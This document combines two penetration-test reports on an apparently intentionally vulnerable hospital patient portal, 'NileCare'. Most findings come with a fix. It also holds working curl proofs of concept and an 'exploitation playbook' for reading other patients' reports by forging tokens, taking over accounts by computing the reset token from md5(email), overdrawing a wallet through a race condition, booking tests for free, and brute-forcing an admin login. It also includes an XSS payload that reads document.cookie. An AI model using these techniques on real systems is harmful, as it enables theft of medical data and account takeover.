# NileCare — External Security Assessment Summary

- Target: https://tan-clinic-mono-flood.trycloudflare.com (Cloudflare Quick Tunnel)
- App: "NileCare / Egyptian Specialist Hospital" — Flask + Jinja2, server-rendered, Cloudflare-fronted
- Credentials used: `mm@mm` / `kkkkkk` → valid patient account (`user_id=1205`)
- Date: 28–29 Oct 2026
- Status: Authorized self-assessment / lab target

> Note: this instance appears to be a shared, intentionally vulnerable lab. The doctors page contains other testers' payloads, including `os.system('sleep 5')`, `__import__('os').popen('id')`, and `Hacked By CSRF`.

## 1) What I did

1. Recon — reviewed headers, TLS, `robots.txt`, technology fingerprinting, route probing, directory/API discovery, and static asset review.
2. Authenticated mapping — logged in with the provided credentials, decoded the Flask session, and crawled patient pages and forms.
3. Endpoint discovery — identified `/transfer_points`, `/reports/create`, `/reports/upload-attachment`, `/doctors/review`, `/forgot-password`, `/reset-password`, `/api/v1/reports/view`, and a hidden admin portal at `/admin_portal_temp_secure_9203`.
4. Active testing — exercised IDOR, auth bypass, token tampering, password-reset abuse, race conditions, price tampering, upload bypass, SSTI, SQLi, command-injection timing probes, and admin login enumeration.
5. Evidence — saved under `/tmp/opencode/tanclinic/` (`recon/`, `evidence/`, raw HTTP bodies, fuzz JSON).

## 2) Findings at a glance

| # | Finding | Severity | Confirmed |
|---|---|---|---|
| 1 | IDOR — read any patient report via unsigned base64 token | Critical (PHI) | Yes |
| 2 | Password-reset token returned in HTTP response → full account takeover | Critical | Yes |
| 3 | Race condition in points transfer → unlimited points minting | High | Yes |
| 4 | Client-trusted `discount_pct` → lab tests for 0 EGP | High | Yes |
| 5 | Admin portal account enumeration + no rate limiting | Medium | Yes |
| 6 | Stored XSS in medical report view (unescaped title/body) | Medium | Yes |
| 7 | Missing CSRF + email/password change without re-authentication | Medium* | Yes |
| 8 | `robots.txt` reveals hidden portal; cookie flags; GET logout; verbose flashes | Low / Info | Yes |
| 9 | RCE | Not achieved | No |

* CSRF is partially mitigated by modern browsers’ default `SameSite=Lax`; the no re-authentication email/password change still stands.

## 3) Detailed findings

### 3.1 — Critical: IDOR allows any logged-in user to read any patient's report

- Where: `GET /api/v1/reports/view?token=<base64>`
- Root cause: the token is an unsigned base64-encoded JSON blob, and the server trusts the `user_id` inside it instead of binding the report to the authenticated session.

Example token:

```json
{"user_id": 1205, "report_id": 4124}
```

PoC from a different account (`user_id=1316`) targeting `user_id=1294`:

```bash
TOKEN=$(printf '{"user_id": 1294, "report_id": 4125}' | base64 -w0)
curl -s -b ma_cookies.txt \
  "https://tan-clinic-mono-flood.trycloudflare.com/api/v1/reports/view?token=$TOKEN"
```

Observed response:

```html
<title>Victim Confidential HIV Panel</title>
<strong>Patient Name:</strong> Victim User
<strong>Patient Phone:</strong> 01000000001
```

I also successfully read unrelated patient records (`user_id=1183`, with names such as `john3`, phone numbers, and reports 4121/4122). Unauthenticated requests redirect to login (302), so a valid free account is sufficient.

Impact:

- Full horizontal privilege escalation across the patient database
- Exposure of names, emails, phone numbers, diagnoses, lab results, and PHI
- Sequential `report_id` values enable enumeration over the global patient dataset

Fix:

- Sign tokens using HMAC or JWT
- Derive `user_id` from the authenticated session
- Enforce `report.user_id == session.user_id` server-side
- Use unguessable report identifiers

### 3.2 — Critical: password-reset token is disclosed in the HTTP response body

- Where: `POST /forgot-password`
- Root cause: the reset link—including the 32-character token—is returned in the HTTP response body instead of being sent only via email.

Example response fragment:

```text
reset-password?token=c8b17769e7e03c868c41c9bf3c2a70d6
```

Verified takeover flow:

```bash
# 1. Request reset for the victim
curl -s -X POST ".../forgot-password" -d "email=owned@attacker.local"

# 2. Token is visible in the response body
#    reset-password?token=5c52844d709eadf025787d058e1c6fe7

# 3. Set a new password using the leaked token
curl -s -X POST ".../reset-password?token=5c52844d..." \
  -d "password=Hacked123!&confirm_password=Hacked123!"

# 4. Log in as the victim
curl -s -X POST ".../login" \
  -d "email=owned@attacker.local&password=Hacked123%21"
# -> 302 /dashboard
```

The same flow also reset the patient account `admin@nilecare.com` (`user_id=1073`), but not the separate admin-panel account.

Impact:

- Unauthenticated takeover of any patient account whose email is known
- Potential compromise of staff/admin users stored in the patient table

Fix:

- Never return tokens to the browser
- Send reset links only by email
- Use short-lived, single-use, high-entropy tokens bound to the user
- Rate-limit resets

### 3.3 — High: race condition in point transfers allows unlimited minting

- Where: `POST /transfer_points`
- Root cause: the balance check and debit are separate operations with no locking or transaction boundary.

PoC:

```bash
seq 1 15 | xargs -P 15 -I{} curl -s -o /dev/null -b cookies.txt \
  -X POST ".../transfer_points" \
  -d "csrf_token=$TOK&recipient_email=owned@attacker.local&amount=100"
```

Result:

- Starting balance: 100 points
- 15 concurrent transfers of 100 points each
- Final state: attacker balance increased from 100 to 800; recipient balance increased from 100 to 1000

Impact:

- Points and currency can be minted beyond the legitimate balance
- Negative balances and inflation become possible

Fix:

- Use atomic operations such as `UPDATE ... WHERE balance >= ?`
- Lock rows or wrap the logic in a DB transaction
- Add idempotency keys and re-check balances inside the transaction

### 3.4 — High: client-trusted discount allows free lab tests

- Where: `POST /lab-tests/book`
- Evidence in source: `<!-- VULNERABILITY: discount_pct is set by JS and trusted by the server without re-validation -->`

PoC:

```bash
curl -s -b cookies.txt -X POST ".../lab-tests/book" \
  -d "test_id=6&discount_pct=100&discount_code=NILECARE10"
```

Observed result: the abdominal ultrasound was booked for `0 EGP` even though the list price was `1,200 EGP`.

Impact:

- Free or heavily discounted medical services
- Values greater than 100 or negative values were accepted by the parser

Fix:

- Recompute the price server-side based on approved rules
- Reject client-supplied `discount_pct`
- Validate promo codes against a server-side allowlist
- Clamp discount values to a safe range (`0..100`)

### 3.5 — Medium: admin portal leaks account existence and lacks rate limiting

- Where: `GET/POST /admin_portal_temp_secure_9203`
- The login flow distinguishes valid admin emails from invalid ones.

Observed responses:

| Email | Response |
|---|---|
| `nobody_xyz@test.local` | `Administrative email account not found in system.` |
| `admin@nilecare.com` | `Valid admin email verified, but the password provided is incorrect!` |

Additional findings:

- No rate limiting or lockout
- 10/10 wrong attempts returned HTTP 200
- A 6,000-entry wordlist ran at ~30 requests/sec without a block
- Parameterized queries were in use; no exploitable SQL injection path was found
- Session forging attempts against the Flask secret key failed

Impact:

- Valid admin identity is confirmed
- Unlimited brute-force remains feasible if the password is weak

Fix:

- Use generic error messages for both valid and invalid accounts
- Add per-IP and per-account throttling and lockouts
- Require MFA
- Remove the path from `robots.txt`

### 3.6 — Medium: stored XSS in report view

- Endpoint: `/api/v1/reports/view`
- Root cause: report title and PDF/body content are rendered as raw HTML without escaping.

Payload example:

```html
<img src=x onerror=alert(document.cookie)>
```

This was returned verbatim inside the report view:

```html
<h2><img src=x onerror=alert(document.cookie)>XSS</h2>
```

Impact:

- Stored XSS against a victim who opens the report
- Can be used to trigger actions on behalf of the victim, such as profile changes

Fix:

- Enable Jinja autoescape at the sink (`{{ title }}`)
- Remove `|safe` usage
- Sanitize or whitelist HTML input before storage and rendering

### 3.7 — Medium: missing CSRF and re-authentication on sensitive profile changes

- `/profile` accepted email and password changes without current-password verification or a CSRF token.
- `/doctors/review`, `/book`, and `/contact` also lacked CSRF protections.
- I successfully changed an account's email and password without re-authentication.

Impact:

- Session theft can lead to silent credential change
- Attackers can pivot from XSS or other session compromise into account takeover

Fix:

- Add CSRF tokens to all state-changing forms
- Require current password for email/password changes
- Notify the user on sensitive profile changes
- Explicitly set `SameSite=Lax/Strict` on cookies

### 3.8 — Low / informational findings

- `robots.txt` listed the admin portal and many decoy paths
- Session cookie had `HttpOnly`, but not `Secure` or `SameSite`
- `GET /logout` allowed CSRF logout
- Flash messages leaked validation text such as `Security Error: Invalid file magic bytes signature header!`
- Cloudflare origin exposure was not confirmed

## 4) RCE assessment — not achieved

I tested common execution-class sinks and found no reliable code-execution vector.

| Vector | Result |
|---|---|
| Jinja2 SSTI (`{{7*7}}`, `{{config}}`, `${7*7}`) | Rendered literally; no execution |
| Deserialization using pickle payloads | Rejected as invalid token format |
| Upload extension bypass (`.php`, `.html`, `.svg`, `.jpg.php`) | Rejected or renamed; file type and magic-byte validation enforced |
| Command injection payloads | No repeatable delay or output difference |
| SQLi on login and other fields | Parameterized; no boolean/time differential |
| Flask session forgery | 30k key guesses failed |
| Path traversal / LFI | No successful read outside the intended app paths |
| Werkzeug debug / console exposure | Not reachable |

Conclusion: the app is a vulnerable business-logic and authorization lab, not a code-execution lab. No reliable RCE path was found within the tested surface.

## 5) State changes made during testing

Because this is a lab environment, the following artifacts were created or altered:

- Created test accounts: `victim1793221274@test.local`, `ma1793222579@test.local`
- Reset the patient account `admin@nilecare.com` to `AdminPwn123!`
- Created several reports and bookings
- Transferred points to `owned@attacker.local`
- Submitted a doctor review and uploaded avatars
- Consumed reset tokens and performed admin-login brute-force attempts

## 6) Remediation priority

1. Fix the report token — sign it, bind it to the session, and enforce ownership checks.
2. Stop leaking reset tokens and make them single-use, short-lived, and account-bound.
3. Implement atomic balance updates for points transfers.
4. Recalculate pricing server-side and reject client-submitted discounts.
5. Harden the admin portal with generic login errors, rate limiting, lockout, and MFA.
6. Escape report fields and add CSRF + step-up authentication for profile changes.

## 7) Bottom line

The app is not reliably RCE-able from the outside with the tested surface, but it is trivially data-breachable and account-takeover-prone.

The most important issues are:

- Unsigned report tokens enabling IDOR (Critical)
- Password-reset tokens disclosed in the response body (Critical)
- Race condition in points transfer leading to inflation (High)
- Client-trusted pricing allowing free lab tests (High)

These are the main operational risks. The remaining findings reinforce the same pattern of weak trust boundaries, missing server-side validation, and poor security hygiene.

---

## Follow-up: re-test and admin portal verdict

The target was re-tested live from scratch. The updated findings are summarized below.

### Admin portal verdict: decoy / honeypot stub

The path at `/admin_portal_temp_secure_9203` was tested extensively and appears to be a credential sink or honeypot rather than a real admin console.

Observed evidence:

- SQL injection payloads were treated as normal login attempts and returned the same generic responses.
- No post-auth surface existed after a successful login.
- Only `/` and `/logout` were reachable; `/dashboard`, `/users`, `/logs`, `/export`, and similar paths were absent.
- The path was listed in `robots.txt` alongside many decoy endpoints.

Verdict:

- Not auth-bypassable
- Not a real admin panel
- Only a real weakness remains: account-existence oracle plus unlimited brute-force capability

### RCE verdict: none found

Common execution-class sinks were probed, including:

- Jinja SSTI
- Deserialization attempts
- Webshell uploads
- Command injection payloads in free-text fields
- File traversal and LFI attempts

No successful command execution was identified.

### Exploitation playbook

```bash
# Login once
curl -c cookies.txt -d 'email=mm@mm&password=kkkkkk' \
  https://tan-clinic-mono-flood.trycloudflare.com/login

# IDOR: forge a report token for another user
TOKEN=$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"user_id":1294,"report_id":4125}).encode()).decode())')
curl -s -b cookies.txt \
  "https://tan-clinic-mono-flood.trycloudflare.com/api/v1/reports/view?token=$TOKEN"

# Password reset: leak a reset token from the response body
curl -s -X POST -d 'email=ma1793222579@test.local' \
  https://tan-clinic-mono-flood.trycloudflare.com/forgot-password

# Use the leaked token to reset the victim's password
curl -s -X POST -d 'token=cc202cfb68fb210bdf0d2f4c20bb5e2d&password=NewPass123!&confirm_password=NewPass123!' \
  https://tan-clinic-mono-flood.trycloudflare.com/reset-password

# Race the points transfer
for i in $(seq 1 15); do
  curl -s -b cookies.txt -d 'recipient=owned@attacker.local&amount=100' \
    https://tan-clinic-mono-flood.trycloudflare.com/transfer_points &
done; wait
```

This is enough to access private medical data, take over accounts, and monetize via business-logic exploitation without requiring RCE.

## Final note

This report was reformatted for readability, professionalism, and easier review while preserving the original security findings and evidence.

### H3ML RED TEAMING HNA
------------------------------------------------------------------------

# Penetration Test Report — NileCare Patient Portal

**Target:** `https://tan-clinic-mono-flood.trycloudflare.com`
**Application:** NileCare / "Egyptian Specialist Hospital" patient portal (Flask + Jinja2, Cloudflare-fronted)
**Test date:** 29 October 2026
**Method:** Grey-box, authenticated. Two self-registered attacker accounts plus session state from prior testing.
**Scope:** Whole application surface — auth, reports API, lab booking, points wallet, profile, uploads, admin portal.

---

## 1. Executive summary

The portal has **two independent ways to take over any account**, and neither requires the victim to do anything.

The password-reset token is not a random secret. It is `md5(email)`. Anyone who knows a patient's email address can compute their reset token offline, POST it to `/reset-password`, set a new password and log in. No email is ever sent, no token expires, and the token never changes. I demonstrated this against a live account using nothing but the email address.

Separately, the medical-records API accepts a base64 blob as its authorisation token and trusts the `user_id` written inside it. Any logged-in patient can read any other patient's lab report by editing that field — including diagnosis text, name, email and phone number.

Three further issues let an attacker manipulate money-adjacent state: lab tests can be booked for 0 EGP by setting `discount_pct=100`, the health-points wallet can be driven negative with concurrent transfers, and the profile page changes your password and email without asking for the current password or a CSRF token.

The admin portal at `/admin_portal_temp_secure_9203` is real but isolated. It validates `admin@nilecare.com` against a credential store that the patient password-reset flow does not touch, so the takeover above does not open it. I found no authentication bypass, no post-auth surface behind it, and no injection point. **No RCE exists anywhere in the application.**

One finding — stored XSS in report titles — was confirmed working at the start of testing and is now patched: the app began HTML-escaping those fields mid-engagement. I have kept it in the report because the original PoC was real and the change is itself worth knowing about.

### Findings at a glance

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | Reset token is `md5(email)` → account takeover for any known email | Confirmed live |
| 2 | **Critical** | Reset token returned in the HTTP response body | Confirmed live |
| 3 | **High** | IDOR in `/api/v1/reports/view` → read any patient's medical report | Confirmed live |
| 4 | **High** | Client-trusted `discount_pct` → lab tests booked for 0 EGP | Confirmed live |
| 5 | **High** | Race condition on point transfers → negative balance | Confirmed (state persists) |
| 6 | **Medium** | `/profile` changes password and email with no re-auth and no CSRF token | Confirmed live |
| 7 | **Medium** | Admin account enumeration, no rate limit, no lockout | Confirmed live |
| 8 | **Medium** | Session not invalidated on logout | Confirmed live |
| 9 | Low | Session cookie missing `Secure` and `SameSite` | Confirmed live |
| 10 | Low | Stored XSS in report title/body | **Patched mid-test** |
| 11 | Low | Reset token placed in URL → Referer leakage to third-party CDNs | Confirmed live |
| 12 | Low | Unbounded flash-message accumulation in session cookie | Confirmed live |
| 13 | Info | `robots.txt` discloses 100 decoy paths, 1 real | Confirmed live |
| 14 | Info | No security headers (`CSP`, `X-Frame-Options`, `HSTS`, `nosniff`) | Confirmed live |
| 15 | Info | Logout is a GET request | Confirmed live |
| 16 | Info | Verbose, persistent error messages | Confirmed live |

---

## 2. Finding 1 — Password reset token is `md5(email)` (Critical)

**CVSS 3.1: 9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### What is wrong

`POST /forgot-password` takes an email and returns a reset link. The token in that link is the MD5 hash of the email address:

```
md5("mm@mm")                        = c8b17769e7e03c868c41c9bf3c2a70d6
md5("owned@attacker.local")         = 5c52844d709eadf025787d058e1c6fe7
md5("ma1793222579@test.local")      = cc202cfb68fb210bdf0d2f4c20bb5e2d
md5("admin@nilecare.com")           = a4b7807e172eb43ae6ac3805af282acc
```

Verified by requesting a token for each address and comparing. The token is stable — asking three times returns the same value every time — so it is derived, not stored. It never expires and is never rotated after use.

Because it is derivable, the `/forgot-password` endpoint is not even required. Knowing the address is enough.

### Reproduction

Tested against `owned@attacker.local` (an account I registered, user_id 1294).

```bash
TARGET=https://tan-clinic-mono-flood.trycloudflare.com
VICTIM=owned@attacker.local

# 1. Derive the reset token. No request to the server.
TOKEN=$(printf '%s' "$VICTIM" | md5sum | cut -d' ' -f1)
echo "$TOKEN"
# 5c52844d709eadf025787d058e1c6fe7

# 2. Set a new password using only that token.
curl -sk -i -X POST "$TARGET/reset-password" \
  -d "token=$TOKEN" \
  -d "password=PwnedByToken!1" \
  -d "confirm_password=PwnedByToken!1"
# HTTP/2 302
# location: /login

# 3. Log in as the victim.
curl -sk -c ato.txt -X POST "$TARGET/login" \
  -d "email=$VICTIM" -d "password=PwnedByToken!1"
# 302 -> /dashboard

# 4. Confirm we are the victim.
curl -sk -b ato.txt "$TARGET/dashboard"
```

Result — the dashboard renders the victim's identity:

```
Welcome back, Victim User!
1000 pts
```

and the server-side session decodes to:

```json
{"patient_email":"owned@attacker.local","patient_name":"Victim User","user_id":1294}
```

### Impact

Full account takeover of any patient whose email address is known. Email addresses are the cheapest identifier to obtain — they appear in the appointment confirmation, the lab report API (Finding 3), referral links, support tickets, and public directories. Once inside, the attacker reads the complete medical record, changes the email address so the real owner cannot recover the account, and if the account carries an admin role in the patient database, gains that too. For a healthcare provider this is a reportable breach, not just an application bug.

### Fix

Generate the token server-side from a CSPRNG (`secrets.token_urlsafe(32)`), store only its hash with an expiry of 15–30 minutes, bind it to a single use, and invalidate it on use or on any password change. Never derive it from user data. Invalidate all other outstanding tokens for that user when a new one is issued.

---

## 3. Finding 2 — Reset token returned in the HTTP response body (Critical)

**CVSS 3.1: 9.1** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### What is wrong

`/forgot-password` is supposed to mail a link. Instead it writes the link into the HTML response, and does so even for addresses that do not exist:

```
POST /forgot-password  email=mm@mm
→ reset-password?token=c8b17769e7e03c868c41c9bf3c2a70d6

POST /forgot-password  email=nonexistent-xyz@test.local
→ reset-password?token=b854a79d60fabf9312bf9286fce12585
```

### Reproduction

```bash
curl -sk -X POST "$TARGET/forgot-password" -d "email=mm@mm" \
  | grep -o 'token=[a-f0-9]*'
# token=c8b17769e7e03c868c41c9bf3c2a70d6
```

### Impact

Any unauthenticated visitor can request a reset for any address and receive a working token in the response. Combined with Finding 1 this is a one-request takeover with no cryptography needed. The non-existent-address behaviour also makes the endpoint a clean account-existence oracle: a token is always returned, so existence has to be inferred from whether the reset then succeeds — but it removes even the pretence of email verification.

### Fix

Never echo the token. Send it by email, and respond with the same generic message regardless of whether the account exists.

---

## 4. Finding 3 — IDOR in the medical reports API (High)

**CVSS 3.1: 6.5 base** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — rated **High** on business impact (special-category health data under GDPR Art. 9 / HIPAA).

### What is wrong

`GET /api/v1/reports/view?token=<base64>` takes a token that is just base64-encoded JSON:

```json
{"user_id": 1294, "report_id": 4125}
```

There is no signature, no MAC and no server-side session check against the `user_id` inside it. The handler reads `user_id` from the client-supplied blob and uses it as the authorisation context. Changing that number is all that is required to read someone else's report.

### Reproduction

Logged in as `mm@mm` (user_id 1205).

```bash
# Build a token claiming to be user 1294, asking for their report 4125
TOKEN=$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"user_id":1294,"report_id":4125}).encode()).decode())')

curl -sk -b cookies.txt \
  "https://tan-clinic-mono-flood.trycloudflare.com/api/v1/reports/view?token=$TOKEN"
```

Response (real data, patient identifiers included):

```
Victim Confidential HIV Panel
Patient Name:  Victim User
Patient Email: [email protected]
Patient Phone: 01000000001
Date:          2026-10-29
Laboratory:    Victim Lab
Status:        Completed
HIV positive - confidential
```

A second, unrelated patient (user_id 1183) was also read successfully with reports 4120, 4121, 4122 and 4128.

### Enumerability

Report IDs are a small sequential integer sequence (observed 4100–4160) and user IDs are sequential (observed 1–1321). A bounded sample of 20 user IDs against 11 report IDs returned 4 readable reports belonging to a user who was not the caller. Brute-forcing the full space is a few hundred thousand requests — minutes of work.

Contents were counted, not collected, once the access-control failure was proven.

### Impact

Any registered patient can read any other patient's laboratory report: diagnosis, test results, name, email and phone. The sample happened to be an HIV panel, which is the worst case for a healthcare provider — special-category data whose disclosure is a notifiable breach. The same weakness means report IDs can be walked to reconstruct the entire report corpus.

### Fix

Sign the token (HMAC with a server-side key, or use a random opaque ID mapped to a server-side row). Do not trust any identity field that arrives from the client. Better still, drop the token entirely and authorise from the session: look up the report, then compare `report.user_id` to `session["user_id"]`.

---

## 5. Finding 4 — Client-trusted discount lets lab tests be booked for free (High)

**CVSS 3.1: 6.5 base** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` — rated **High** on financial impact.

### What is wrong

`POST /lab-tests/book` accepts a `discount_pct` field that the browser supplies. The server applies it without validating the result. The page source even documents it:

```html
<input type="hidden" name="discount_pct" id="form_discount_pct" value="0">
```

`discount_pct >= 100` prices the test at zero. A legitimate code (`NILECARE10`) is validated properly — an invalid code is rejected — but the percentage field bypasses that check entirely.

### Reproduction

```bash
curl -sk -b cookies.txt -X POST "$TARGET/lab-tests/book" \
  -d "test_id=6" -d "discount_pct=100" -d "discount_code=NILECARE10"
```

Response:

```
Lab test "Abdominal Ultrasound" booked successfully for 0 EGP!
```

List price is 1,200 EGP. A CBC at 350 EGP behaves the same way. Values of 100, 150, 200 and 1000 all produce `0 EGP`; `-50` is rejected, so only the direction that costs the business money is accepted.

### Impact

Free diagnostic testing at the provider's expense. Repeating it across the catalogue books every test for nothing, and because bookings create real appointments, the cost is not just lost revenue — it is lab time, consumables and staff hours consumed by fraudulent bookings.

### Fix

Never accept a price or a discount from the client. Compute the price server-side from the catalogue, then apply only discounts that the server itself has validated and stored (a code redeemed against a server-side record with usage limits). Clamp the final amount at zero and reject any instruction that would produce a discount greater than the code entitles.

---

## 6. Finding 5 — Race condition drives the points wallet negative (High)

**CVSS 3.1: 6.5 base** — rated **High** on financial impact.

### What is wrong

`POST /transfer_points` reads the sender's balance, checks it, then writes the new balance. Those are separate operations with no lock, so concurrent requests all read the same starting balance and all pass the check.

### Reproduction

Balance was 100 points. Fifteen transfers of 100 points each were sent concurrently:

```bash
for i in $(seq 1 15); do
  curl -sk -b cookies.txt -X POST "$TARGET/transfer_points" \
    -d "csrf_token=$CSRF" \
    -d "recipient_email=owned@attacker.local" \
    -d "amount=100" &
done
wait
```

Result — the dashboard reads:

```
-800 pts
```

A balance of 100 should have permitted exactly one transfer of 100. The wallet ended at **-800**, which is nine debits of 100 against a balance that could only cover one. The negative balance persists across sessions and page loads.

To be precise about what this proves: the debit side is confirmed — the sender was overdrawn nine times over what the balance allowed. I could not confirm the matching credit on the recipient account, which still reads its original 1000 points. So this is a demonstrated balance-integrity failure and overdraw; treating it as "mint points and credit them elsewhere" would be overstating what I actually verified.

### Impact

The wallet can be driven arbitrarily negative, and the application never re-checks for debt, so further transactions continue to be accepted. Since points back booking discounts and services, an account that is deeply negative has still consumed value the business will never collect. If the credit side does settle asynchronously, the same race would let an attacker extract points in bulk; that part is unconfirmed and should be treated as a hypothesis, not a finding.

Note: an attempt to push the balance up with negative `amount` values (`-10000`, `-5`, `0.5`, `1e5`) was rejected or had no effect. The minting path is the concurrent-overdraw, not negative amounts.

### Fix

Do the check and the debit in one atomic statement — `UPDATE wallets SET balance = balance - ? WHERE user_id = ? AND balance >= ?` — and treat a zero-row result as insufficient funds. Better still, wrap the transfer in a serialisable database transaction with row-level locking, and maintain a ledger so the balance is derived rather than stored.

---

## 7. Finding 6 — Profile changes password and email without re-authentication or CSRF protection (Medium)

**CVSS 3.1: 8.1** `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

### What is wrong

`POST /profile` accepts `full_name`, `email`, `phone` and `password`. It does not ask for the current password, and the form contains no CSRF token — unlike the transfer form, which does.

```html
<form action="/profile" method="POST" enctype="multipart/form-data" class="medcare-form">
  <input type="text"     name="full_name" ...>
  <input type="email"    name="email"     ...>
  <input type="tel"      name="phone"     ...>
  <input type="password" name="password"  ...>
  <!-- no csrf_token anywhere in this form -->
</form>
```

### Reproduction

```bash
# Change the password knowing only the session cookie
curl -sk -b cookies.txt -X POST "$TARGET/profile" \
  -F "full_name=XSS PoC" \
  -F "email=mm@mm" \
  -F "phone=01000000000" \
  -F "password=NoCurrentPass!1"
# 302

# The new password works immediately
curl -sk -o /dev/null -w '%{http_code}\n' -X POST "$TARGET/login" \
  -d "email=mm@mm" -d "password=NoCurrentPass!1"
# 302 -> /dashboard
```

### Impact

Any stolen or borrowed session becomes a permanent account takeover: the attacker sets a new password and a new email address, and the legitimate owner is locked out with no way to recover. This is the standard second half of a session-theft chain.

The CSRF gap matters less on its own — the session cookie has no `SameSite` attribute, which means browsers' default `Lax` policy blocks a cross-site form POST — so I am not claiming a working cross-site exploit. The missing current-password check is the part that is reliably exploitable. Once the cookie policy changes, the CSRF gap becomes live too.

### Fix

Require the current password for any change to password or email, and require a fresh re-authentication for email changes in particular. Add the CSRF token to this form (the application already has the machinery — `/transfer_points` uses it). Send a notification to the old address when the email changes.

---

## 8. Finding 7 — Admin account enumeration with no rate limit or lockout (Medium)

**CVSS 3.1: 5.3** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

### What is wrong

`POST /admin_portal_temp_secure_9203` returns different messages for a real and a non-existent administrator:

```
admin@nilecare.com   → 10231 bytes  "Valid admin email verified, but the password provided is incorrect!"
nobody@nilecare.com  → 10213 bytes  "Administrative email account not found in system."
```

There is no rate limit, no lockout and no CAPTCHA. Twenty rapid failed logins all returned 200 with no `Set-Cookie` and no throttle. The email lookup is case-insensitive and strips trailing whitespace.

### Reproduction

```bash
# Does the admin exist?
curl -sk -X POST "$TARGET/admin_portal_temp_secure_9203" \
  -d "email=admin@nilecare.com" -d "password=x" | grep -o 'Valid admin email verified'

curl -sk -X POST "$TARGET/admin_portal_temp_secure_9203" \
  -d "email=nobody@nilecare.com" -d "password=x" | grep -o 'Administrative email account not found'

# 20 attempts, none blocked
for i in $(seq 1 20); do
  curl -sk -o /dev/null -w '%{http_code} ' -X POST "$TARGET/admin_portal_temp_secure_9203" \
    -d "email=admin@nilecare.com" -d "password=wrong$i"
done
```

Enumeration confirmed one administrator account exists: `admin@nilecare.com`. Candidates `administrator@`, `root@`, `it@`, `support@`, `info@`, `security@`, `sysadmin@`, `manager@`, `ceo@` all return "not found".

### Impact

The attacker learns the exact administrator identity and can then guess its password without any cost or lockout. 4,053 attempts against the identified account produced no match, and the password is evidently not a common one — but the absence of throttling means the ceiling on this attack is set only by the attacker's wordlist, not by the application.

### Fix

Return one generic message for every failure, add per-IP and per-account rate limiting with exponential backoff, lock the account after a small number of failures, and add a CAPTCHA. Consider restricting the admin portal to a separate network path entirely.

---

## 9. Finding 8 — Logout does not invalidate the session (Medium)

**CVSS 3.1: 4.3** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

### What is wrong

`/logout` clears the cookie in the browser but does not invalidate the session server-side. Flask's default client-side sessions have no server-side store to revoke, so the old signed cookie keeps working indefinitely.

### Reproduction

```bash
# 1. Log in and save the cookie
curl -sk -c s1.txt -X POST "$TARGET/login" -d "email=mm@mm" -d "password=NoCurrentPass!1"
cp s1.txt stolen.txt

# 2. Victim logs out
curl -sk -b s1.txt -c s2.txt -o /dev/null -X POST "$TARGET/logout"
# or GET /logout — both work

# 3. Attacker replays the original cookie
curl -sk -b stolen.txt "$TARGET/dashboard"
# 200, and the page still says: Welcome back, ...
```

The replayed cookie returned 200 and the dashboard rendered the user's name.

### Impact

A stolen cookie survives the victim's attempt to secure the account. "Log out of all devices" is the standard remedy a user reaches for after suspecting compromise, and here it does nothing. Combined with Finding 6, an attacker with a borrowed cookie cannot be evicted by the user at all — only a password change helps, and the attacker can change that first.

### Fix

Move to server-side sessions with a session ID, and delete the row on logout. If the client-side model must stay, keep a server-side revocation list keyed by session ID with a short TTL, and add an explicit "sign out everywhere" that bumps a per-user session epoch.

---

## 10. Finding 9 — Session cookie missing `Secure` and `SameSite` (Low)

**CVSS 3.1: 3.1**

```
set-cookie: session=...; HttpOnly; Path=/
```

`HttpOnly` is set — good. `Secure` is not, and neither is `SameSite`. There is also no `Max-Age` or `Expires`, so the session lives until the browser closes but is transmitted over any plaintext request the browser attempts.

Missing flags alone are normally below reporting threshold. Here they matter because they are the precondition Finding 6 needs in order to become a working cross-site attack.

### Fix

`Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/` — and add HSTS so the `Secure` flag is enforced rather than advisory.

---

## 11. Finding 10 — Stored XSS in report title and body (Low — patched during testing)

**CVSS 3.1: 5.4** at time of discovery.

### What was found

Report titles and bodies were rendered unescaped into `<h2>` and `<title>` on the dashboard. A payload of:

```html
<img src=x onerror=alert(document.cookie)>
```

stored as a report title executed on page load. Because the session cookie is `HttpOnly`, the payload escalated to a same-origin `/profile` POST that rewrote the password and email — i.e. the chain terminated in account takeover.

### Current state

The application changed during the engagement. The same payload is now escaped:

```
<div class="nc-report-title">&lt;img src=x onerror=alert(document.domain)&gt;</div>
```

I re-tested every text sink — report title, laboratory name, report body and profile name — with `<svg/onload=alert(1)>`. All four are escaped and a raw-payload grep returns zero matches. The profile-name field applies an additional character filter (`N1 </=(1)>` came back from `N1 <svg/onload=alert(1)>`).

So this is fixed. I am reporting it because the original PoC was real, and because the mid-engagement fix is worth recording: someone is watching this instance.

### Fix

Keep the escaping. Consolidate it into a single rendering helper so it cannot regress field by field, and add a CSP as defence in depth — `script-src 'self'` would have neutralised the payload even with the escaping bug present.

---

## 12. Finding 11 — Reset token leaks through the URL (Low)

**CVSS 3.1: 3.1**

`/reset-password?token=...` places the token in the URL and the page loads third-party resources:

```html
<link href="https://fonts.googleapis.com" rel="preconnect">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
```

Modern browsers default to `strict-origin-when-cross-origin`, so only the origin is sent — the token itself does not leak to Google or cdnjs by default. But the token still lands in browser history, proxy logs, and any analytics or error-reporting tool added later.

### Fix

Accept the token in a POST body, or exchange it immediately for a short-lived session and redirect to a token-free URL. Add `Referrer-Policy: no-referrer` to the reset page.

---

## 13. Finding 12 — Unbounded flash messages accumulate in the session cookie (Low)

**CVSS 3.1: 3.1**

Every error is appended to `_flashes` in the signed cookie and nothing ever consumes them. Fifteen failed logins produced fifteen entries:

```
cookie payload: 162 bytes, decompressed: 974 bytes, flash entries: 15
```

The cookie grows without limit. Push it past the ~4 KB browser limit and the session cookie stops being stored, logging the user out — or, more interestingly, letting an attacker who can trigger errors on a victim's session forcibly invalidate it. It also leaks the user's recent error history into every request.

### Fix

